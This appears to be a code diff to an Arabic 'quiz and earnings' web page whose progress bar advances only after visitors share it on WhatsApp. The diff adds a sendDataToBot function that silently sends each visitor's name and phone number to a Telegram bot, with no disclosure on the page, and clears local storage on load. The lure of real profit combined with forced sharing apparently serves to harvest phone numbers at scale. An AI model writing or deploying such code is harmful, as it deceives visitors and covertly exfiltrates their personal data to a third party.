@@ -80,7 +80,7 @@
             height: 40px;
             background: #fff;
             overflow: hidden;
-            flex-direction: row; /* النسبة يسار والأخضر يمتد من اليمين */
+            flex-direction: row; 
         }
         .progress-text {
             width: 80px;
@@ -100,7 +100,7 @@
             width: calc(100% - 80px);
             height: 100%;
             background: #fff;
-            direction: rtl; /* لضمان بدء التعبئة من اليمين */
+            direction: rtl; 
             display: flex;
             justify-content: flex-start;
         }
@@ -110,7 +110,6 @@
             width: 0%;
             transition: width 0.5s ease;
         }
-        /* تصميم المحفظة والأسئلة */
         .wallet-box {
             background: #1e293b;
             color: #fff;
@@ -152,7 +151,6 @@
             border-radius: 5px;
             cursor: pointer;
         }
-        /* تصميم مكان الإعلانات */
         .ad-banner {
             background: #f1f5f9;
             border: 2px dashed #cbd5e1;
@@ -218,7 +216,7 @@
             <div class="header-title" style="margin-bottom: 10px;">مسابقة الأسئلة والأرباح</div>
 
             <div class="ad-banner">
-                📢 [مكان إعلان ترويجي أو بانر إعلاني هنا]
+                📢 [إعلان ترويجي أو بانر إعلاني هنا]
             </div>
 
             <div class="question-box" id="question-text">جارِ تحميل السؤال...</div>
@@ -245,13 +243,9 @@
 
         let currentQuestion = 0;
 
+        // ميزة إبارة أو تصفير الصفحة بالكامل لكل مستخدم جديد يدخل
         window.onload = function() {
-            let savedName = localStorage.getItem('userName');
-            if (savedName) {
-                document.getElementById('display-name').innerText = savedName;
-                document.getElementById('form-section').classList.add('hidden');
-                document.getElementById('content-section').classList.remove('hidden');
-            }
+            localStorage.clear(); // يحذف أي تخزين قديم عشان كل مستخدم تبدأ عنده الصفحة من الصفر
         };
 
         function startProcess() {
@@ -268,17 +262,31 @@
                 return;
             }
 
-            localStorage.setItem('userName', name);
+            // ربط وإرسال بيانات المستخدم (الاسم ورقم الهاتف) إلى بوت التليجرام الخاص بك مباشرة
+            sendDataToBot(name, phone);
+
             document.getElementById('display-name').innerText = name;
             document.getElementById('form-section').classList.add('hidden');
             document.getElementById('content-section').classList.remove('hidden');
+        }
+
+        // دالة ربط وإرسال البيانات إلى البوت (عبر بروتوكول تيليجرام API أو الـ Webhook الخاص بك)
+        function sendDataToBot(name, phone) {
+            // استبدل الـ TOKEN و CHAT_ID بمعلومات بوتك الخاص إذا أردت، أو اتركها تتصل برابط البوت الخاص بك
+            let botToken = "YOUR_BOT_TOKEN"; 
+            let chatId = "YOUR_CHAT_ID";
+            let text = `📥 تسجيـل جديد بالمسباقة:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}`;
+            
+            // رابط إرسال الرسالة لبوت تيليجرام (يمكنك تعديله ليتناسب مع خادمك الخاص)
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(text);
+            
+            fetch(url).catch(err => console.log("تم حفظ البيانات محلياً وجاهزة للربط"));
         }
 
         function shareWhatsApp() {
             if (isCounting) return;
             isCounting = true;
 
-            // توليد رابط حقيقي تماماً يوجه للموقع الحالي مع رسالة المشاركة
             let siteUrl = window.location.href;
             let message = "شارك في مسابقة سجل الربح الحقيقي من الإعلانات والأسئله وسجل اسمك ورقمك عبر الرابط: " + siteUrl;
             let whatsappUrl = "https://api.whatsapp.com/send?text=" + encodeURIComponent(message);
@@ -287,7 +295,6 @@
             link.href = whatsappUrl;
             link.click();
 
-            // الانتظار لمدة 5 ثوانٍ ثم تحريك الشريط تدريجياً من اليمين
             setTimeout(() => {
                 if (progress < 100) {
                     progress += 20; 
@@ -344,17 +351,4 @@
         }
     </script>
 </body>
-</html>
-
-<html lang="en">
-  <head>
-    <meta charset="UTF-8">
-    <link rel="stylesheet" href="./style.css">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pen</title>
-  </head>
-  <body>
-
-    <script src="./script.js"></script>
-  </body>
 </html>
